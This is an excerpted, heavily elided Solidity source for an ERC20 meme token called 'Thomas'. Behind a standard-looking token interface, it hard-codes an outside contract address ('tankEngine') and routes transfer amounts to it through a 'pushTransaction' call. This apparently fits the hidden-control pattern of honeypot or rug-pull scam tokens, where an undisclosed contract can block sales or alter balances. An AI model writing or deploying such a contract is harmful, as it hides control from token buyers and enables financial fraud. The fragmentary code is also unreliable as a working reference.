...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _tankEngine = 0xf567E2DC732B30B5D448464753Ec9a772e496fF2;
    address public pair;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        tankEngine = IERC777(_tankEngine);
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return tankEngine.pushTransaction(amount);
    }
    ...
    function _DeployThomas(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployThomas(creator, initialSupply);
    }
}

contract Thomas is ERC20Token {
    constructor() ERC20Token("Thomas", "THOMAS", msg.sender, 4206900000 * 10 ** 18) {
    }
}